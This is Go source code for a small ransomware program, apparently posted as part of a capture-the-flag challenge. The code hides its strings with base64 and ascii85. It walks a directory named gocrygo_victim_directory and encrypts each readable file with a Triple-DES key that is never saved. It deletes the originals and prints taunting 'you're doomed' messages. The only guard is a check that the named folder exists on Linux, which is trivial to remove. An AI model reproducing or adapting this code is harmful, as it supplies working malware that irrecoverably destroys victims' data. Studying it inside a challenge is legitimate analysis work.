// Flag is not here
// Here's the source code in case you're curious

package main

import (
    "crypto/rand"
    "crypto/cipher"
    "crypto/des"
    "encoding/ascii85"
    "encoding/base64"
    "errors"
    "fmt"
    "io/fs"
    "log"
    "os"
    "path/filepath"
    "runtime"
    "sync"
    "strings"
)

var (
    linuxEncode string
    idFileEncode string
    victimDirectoryEncode string
    htmlURLEncode string
    dotqqEncode string
    runThisBinaryOnLinuxEncode string
    iDontWantToBreakYourFileSystemEncode string
    cannotAccessDirectory string
    cannotEncryptLuckyYouEncode string
    oopsYourFileSystemHasBeenEncryptedEncode string
    sadlyNoDecryptionServiceEncode string
    youreDoomedEncode string
)

func dieIfErrNotNil(err error) {
    if err != nil {
        log.Fatal(err)
    }
}

func decodeString(b64 string) string {
    b85, err := base64.StdEncoding.DecodeString(b64)
    dieIfErrNotNil(err)
    b85Bytes := make([]byte, ascii85.MaxEncodedLen(len(b85)))
    _, _, err = ascii85.Decode(b85Bytes, b85, true)
    dieIfErrNotNil(err)
    return strings.Trim(string(b85Bytes), "\x00")
}

func init() {
    linuxEncode = "Q2hbZDBHUQ=="
    idFileEncode = "L25dKjRFZDs7OQ=="
    victimDirectoryEncode = "QjVfOiNIIlYmJkcla0guQmwuM2ZCbFtjcEZEbDJG" // gocrygo_victim_directory
    htmlURLEncode = "QlFTPzhGI2tzLUdCZS49REttZFVHOyFUSUByY2otRF8+XkZELzk="
    dotqqEncode = "L29iaw=="
    runThisBinaryOnLinuxEncode = "OmknXU9GKEhKN0ZgJj1EQlBETjFAVkteZ0VkOGRHREJNVmVES1Ux"
    iDontWantToBreakYourFileSystemEncode = "ODdkJmkrQSFcZERmLXFFK0VxNzNGPEdbRCtDXUEmQDtAITJEZnAoQ0FuYydtK0VNZ0xGQ2Y7QStBY2xjQDw2ISZAcmMtaEZDY1MnK0NvMixBUmZoI0VkOGNUL2healVAcmNqLURkUlslQHJ1RiU/WSFra0FSZmgjRWQ5I1RAO11UdUUsOHJtQUtZRHRDYG1oNUFLWVQhQ2g3WjFII0lnSkdAPkIyK0VWTkVBU3UhdUgjUmpKQmw1Ji1GPW0="
    cannotAccessDirectory = "Nlhha01EZmQrMUBxMChrRiEsIi1FYi9hJkRmVStHLVlJQC1FZDs7OT9acC1uRkQ1VCFBOC0ncUBydVgwR3BiV3FFK08nLEJsZT8wRGYtXC5BU3UzbkEs"
    cannotEncryptLuckyYouEncode = "N1VeIklBUmxwKkRdaVYvQHJjajZGPERsUTNacjZdQHIkPzRII0loU0lL"
    oopsYourFileSystemHasBeenEncryptedEncode = "Ok4oMm4vMEs0VkZgSlU6QmwlPydGKlZoS0FTaVEnQDwzUSNBUyNhJUFTdSF1SCNSazpBMWQ="
    sadlyNoDecryptionServiceEncode = "O2RqM1FHcTonY0I1XzojSCJWJUMrQ2ZQN0ViMC0xQ2pALjZEZTN1NERKc1Y+RSxvbD9CazFjdEA7Xj81QTddN2tII1JrPkRmLVw9QVREcy5AcUJeNg=="
    youreDoomedEncode = "PWA4RjFFYi1BKERmOUsoQTFldXBEZjkvL0NpczYnK0ZY"
}

func main() {
    // Check if the current OS is Linux
    runtimeOS := runtime.GOOS
    if runtimeOS != decodeString(linuxEncode) { 
        dieIfErrNotNil(errors.New(decodeString(runThisBinaryOnLinuxEncode)))
    }
    currDir, err := os.Getwd()
    dieIfErrNotNil(err)

    // Victim's directory
    victimDirectory := filepath.Join(currDir, decodeString(victimDirectoryEncode))
    if _, err := os.Stat(victimDirectory); errors.Is(err, os.ErrNotExist) {
        log.Fatal(decodeString(iDontWantToBreakYourFileSystemEncode))
    }

    idFile := filepath.Join(victimDirectory, decodeString(idFileEncode)) // The identity file is .gocrygo
    
    // Check whether the directory is already infected

    encrypted := true
    if _, err := os.Stat(idFile); errors.Is(err, os.ErrNotExist) {
        encrypted = false
    }

    // Screw up the victim's directory

    var errChan chan error
    var wg sync.WaitGroup

    if !encrypted {

        // Create the identity file

        f, err := os.Create(idFile)
        if errors.Is(err, os.ErrPermission) {
            log.Fatal(decodeString(cannotAccessDirectory))
        }
        dieIfErrNotNil(err)

        defer f.Close()

        // Find all interesting files in the victim directory
        var filesToEncrypt []string
        err = filepath.Walk(victimDirectory, func(path string, info fs.FileInfo, err error) error {
            if !info.IsDir() && path != idFile && filepath.Ext(path) != decodeString(dotqqEncode) {
                filesToEncrypt = append(filesToEncrypt, path)
            }
            return err
        })
        dieIfErrNotNil(err)

        // Generate a key for encryption

        key := make([]byte, des.BlockSize * 3)
        _, err = rand.Read(key)
        dieIfErrNotNil(err)

        // Encrypt all interesting files in the victim directory

        errChan = make(chan error, len(filesToEncrypt))
        for _, fileToEncrypt := range filesToEncrypt {
            wg.Add(1)

            go func(file string, errChan chan<- error) {
                defer wg.Done()

                // Get the file content & remove the original file
                content, err := os.ReadFile(file)
                if errors.Is(err, os.ErrPermission) { // no read permission, give up
                    errMsg := fmt.Sprintf(decodeString(cannotEncryptLuckyYouEncode), file)
                    errChan <- errors.New(errMsg)
                    return
                }
                os.Remove(file)

                // Encrypt the file with TDEA

                // Generate TDEA block
                block, err := des.NewTripleDESCipher(key)
                dieIfErrNotNil(err)
                // Generate iv
                iv := make([]byte, des.BlockSize)
                _, err = rand.Read(iv)
                dieIfErrNotNil(err)
                // Encrypt the file content
                ciphertext := make([]byte, len(content))
                stream := cipher.NewCTR(block, iv)
                stream.XORKeyStream(ciphertext, content)
                encryptedContent := append(iv, ciphertext...)
                // Write the cipher text to a new file blablabla.qq
                encryptedFilePath := file + decodeString(dotqqEncode)
                os.WriteFile(encryptedFilePath, encryptedContent, 0644)

                for i := 0; i < len(content); i++ {
                    content[i] = 0
                }

            }(fileToEncrypt, errChan)
        }
    } 
    wg.Wait()

    if !encrypted {
        // Print files that were not successfully encrypted
        close(errChan)
        for err := range errChan {
            fmt.Fprintln(os.Stderr, err)
        }
    }

    // Print some "you're fucked up" messages
    fmt.Println(decodeString(oopsYourFileSystemHasBeenEncryptedEncode))
    fmt.Scanln()
    fmt.Println(decodeString(sadlyNoDecryptionServiceEncode))
    fmt.Scanln()
    fmt.Println(decodeString(youreDoomedEncode))
}
